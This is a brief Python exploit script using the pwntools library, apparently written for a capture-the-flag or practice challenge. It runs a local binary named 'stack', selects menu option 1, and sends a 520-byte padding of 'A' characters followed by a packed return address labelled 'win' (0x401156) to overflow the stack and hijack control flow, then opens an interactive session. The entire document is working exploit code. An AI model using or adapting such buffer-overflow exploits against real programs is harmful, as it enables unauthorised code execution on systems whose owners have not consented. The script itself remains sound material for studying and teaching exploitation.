from pwn import *                                                                                                     
                                                                                                                        
p = process('./stack')                                                                  

off = 520
win = 0x401156

p.sendline(b'1')                                                                             

p.sendline(b"A"*off+p64(win))

p.interactive() 
